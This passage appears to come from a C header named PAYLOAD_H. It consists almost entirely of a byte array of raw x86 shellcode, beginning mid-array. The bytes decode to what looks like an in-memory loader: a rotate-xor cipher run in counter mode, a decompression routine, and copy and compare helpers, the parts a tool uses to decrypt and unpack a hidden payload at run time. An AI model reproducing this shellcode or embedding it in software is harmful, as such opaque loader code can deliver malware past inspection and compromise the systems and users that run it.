"\x1c\x53\x55\x56\x8b\x74\x24\x20\x33\xdb\x57\x8d\x7c\x24\x10\xa5"
"\xa5\xa5\xa5\x8b\x4c\x24\x14\x8b\x74\x24\x1c\x8b\x6c\x24\x18\x8b"
"\x7c\x24\x10\x89\x4c\x24\x28\x8b\xce\xc1\xc8\x08\x8b\x74\x24\x28"
"\x03\xc2\xc1\xce\x08\x33\xc7\x03\xf7\xc1\xc2\x03\x33\xf3\xc1\xc7"
"\x03\x33\xd0\x89\x6c\x24\x28\x33\xfe\x8b\xe9\x43\x83\xfb\x1b\x72"
"\xd6\x5f\x5e\x5d\x5b\x83\xc4\x10\xc3\x8b\x54\x24\x10\x83\xec\x14"
"\x53\x8b\x5c\x24\x20\x55\x8b\x6c\x24\x28\x85\xd2\x0f\x84\xec\x00"
"\x00\x00\x33\xc0\x8d\x4b\x0f\x40\x89\x4c\x24\x2c\x2b\xc3\x56\x89"
"\x44\x24\x0c\x57\x8d\x44\x24\x14\x3b\xc1\x77\x04\x8d\x44\x24\x23"
"\x8b\xf3\x8d\x7c\x24\x14\x33\xc9\xa5\xa5\xa5\xa5\x8b\x74\x24\x28"
"\x8b\x04\x8e\x31\x44\x8c\x14\x41\x83\xf9\x04\x72\xf3\x8b\x74\x24"
"\x20\x8b\x44\x24\x1c\x8b\x7c\x24\x18\x8b\x4c\x24\x14\xc7\x44\x24"
"\x30\x10\x00\x00\x00\x03\xcf\x03\xc6\xc1\xc7\x05\x33\xf9\xc1\xc6"
"\x08\x33\xf0\xc1\xc1\x10\x03\xc7\x03\xce\xc1\xc7\x07\xc1\xc6\x0d"
"\x33\xf8\x33\xf1\xc1\xc0\x10\x83\x6c\x24\x30\x01\x75\xd7\x8b\x5c"
"\x24\x28\x89\x4c\x24\x14\x33\xc9\x89\x74\x24\x20\x89\x7c\x24\x18"
"\x89\x44\x24\x1c\x8b\x04\x8b\x31\x44\x8c\x14\x41\x83\xf9\x04\x72"
"\xf3\x6a\x10\x5e\x3b\xd6\x8b\xca\x0f\x47\xce\x85\xc9\x74\x15\x8d"
"\x7c\x24\x14\x8b\xf5\x2b\xfd\x8b\xd9\x8a\x04\x37\x30\x06\x46\x83"
"\xeb\x01\x75\xf5\x8b\x5c\x24\x10\x2b\xd1\x03\xe9\x8b\x4c\x24\x34"
"\x80\x01\x01\x75\x08\x49\x8d\x04\x0b\x85\xc0\x7f\xf3\x8b\x5c\x24"
"\x2c\x8d\x4b\x0f\x85\xd2\x0f\x85\x28\xff\xff\xff\x5f\x5e\x5d\x5b"
"\x83\xc4\x14\xc3\x83\xec\x14\x8b\x4c\x24\x18\x83\x64\x24\x10\x00"
"\x53\x55\x8b\x6c\x24\x24\x8a\x01\x56\x57\x88\x45\x00\x83\xcf\xff"
"\x8d\x45\x01\x33\xf6\x89\x44\x24\x18\x33\xdb\x8d\x41\x01\x89\x5c"
"\x24\x10\x89\x44\x24\x14\x8d\x44\x24\x14\x50\xe8\x67\x01\x00\x00"
"\x59\x85\xc0\x0f\x84\x32\x01\x00\x00\x8d\x44\x24\x14\x50\xe8\x54"
"\x01\x00\x00\x85\xc0\x8d\x44\x24\x18\x59\x50\x74\x7d\xe8\x45\x01"
"\x00\x00\x59\x85\xc0\x74\x37\x6a\x04\x33\xf6\x5b\x8d\x44\x24\x14"
"\x50\xe8\x31\x01\x00\x00\x59\x8d\x34\x70\x83\xeb\x01\x75\xed\x8b"
"\x54\x24\x18\x85\xf6\x74\x0a\x8b\xc2\x2b\xc6\x8a\x00\x88\x02\xeb"
"\x03\xc6\x02\x00\x8b\x5c\x24\x10\x42\xe9\xef\x00\x00\x00\x8b\x44"
"\x24\x14\x8b\x54\x24\x18\x0f\xb6\x38\x40\x8b\xcf\x89\x44\x24\x14"
"\x83\xe1\x01\x83\xc1\x02\xd1\xef\x74\x14\x8b\xf2\x2b\xf7\x8a\x06"
"\x88\x02\x42\x46\x83\xe9\x01\x75\xf5\xe9\xa4\x00\x00\x00\x33\xdb"
"\x43\x89\x5c\x24\x10\xe9\x9c\x00\x00\x00\xe8\xff\x00\x00\x00\x8b"
"\xd0\x59\x85\xf6\x75\x2b\x83\xfa\x02\x75\x26\x8d\x44\x24\x14\x50"
"\xe8\xe9\x00\x00\x00\x8b\x54\x24\x1c\x8b\xf0\x59\x85\xf6\x74\x76"
"\x8b\xca\x2b\xcf\x8a\x01\x88\x02\x42\x41\x83\xee\x01\x75\xf5\xeb"
"\x61\x8b\x4c\x24\x14\x8d\x44\x24\x14\x83\xf6\x01\x2b\xd6\xc1\xe2"
"\x08\x0f\xb6\x39\x81\xc7\x00\xfe\xff\xff\x03\xfa\x41\x50\x89\x4c"
"\x24\x18\xe8\xa7\x00\x00\x00\x59\x8b\xc8\x81\xff\x00\x7d\x00\x00"
"\x72\x01\x41\x8b\x54\x24\x18\x8d\x41\x01\x81\xff\x00\x05\x00\x00"
"\x0f\x42\xc1\x81\xff\x80\x00\x00\x00\x8d\x70\x02\x0f\x43\xf0\x85"
"\xf6\x74\x13\x8b\xca\x2b\xcf\x8a\x01\x88\x02\x42\x41\x83\xee\x01"
"\x75\xf5\x89\x54\x24\x18\x33\xf6\x46\xeb\x18\x8b\x4c\x24\x14\x8b"
"\x54\x24\x18\x8a\x01\x88\x02\x42\x41\x89\x4c\x24\x14\x33\xf6\x89"
"\x54\x24\x18\x85\xdb\x0f\x84\x9b\xfe\xff\xff\x5f\x5e\x2b\xd5\x5d"
"\x8b\xc2\x5b\x83\xc4\x14\xc3\x56\x8b\x74\x24\x08\x8b\x4e\x0c\x8d"
"\x56\x08\x8d\x41\xff\x89\x46\x0c\x85\xc9\x75\x13\x8b\x0e\x0f\xb6"
"\x01\x89\x02\x8d\x41\x01\x89\x06\xc7\x46\x0c\x07\x00\x00\x00\x8b"
"\x02\x5e\x8d\x0c\x00\xc1\xe8\x07\x89\x0a\x83\xe0\x01\xc3\x56\x33"
"\xf6\x46\xff\x74\x24\x08\xe8\xbc\xff\xff\xff\xff\x74\x24\x0c\x8d"
"\x34\x70\xe8\xb0\xff\xff\xff\x59\x59\x85\xc0\x75\xe5\x8b\xc6\x5e"
"\xc3\x8b\x54\x24\x0c\x8b\x44\x24\x04\x56\x8b\xf0\x85\xd2\x74\x13"
"\x57\x8b\x7c\x24\x10\x2b\xf8\x8a\x0c\x37\x88\x0e\x46\x83\xea\x01"
"\x75\xf5\x5f\x5e\xc3\x8a\x44\x24\x08\x8b\x4c\x24\x0c\x57\x8b\x7c"
"\x24\x08\xf3\xaa\x8b\x44\x24\x08\x5f\xc3\x8b\x44\x24\x04\x8b\x4c"
"\x24\x08\x53\x8a\x10\x84\xd2\x74\x0e\x8a\x19\x84\xdb\x74\x08\x3a"
"\xd3\x75\x04\x40\x41\xeb\xec\x0f\xbe\x00\x0f\xbe\x09\x2b\xc1\x5b"
"\xc3\x8b\x54\x24\x04\x8b\x4c\x24\x08\x53\x8a\x02\x84\xc0\x74\x13"
"\x8a\x19\x84\xdb\x74\x0d\x80\xcb\x20\x0c\x20\x3a\xc3\x75\x04\x42"
"\x41\xeb\xe7\x0f\xbe\x02\x0f\xbe\x09\x2b\xc1\x5b\xc3\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";



#endif // PAYLOAD_H
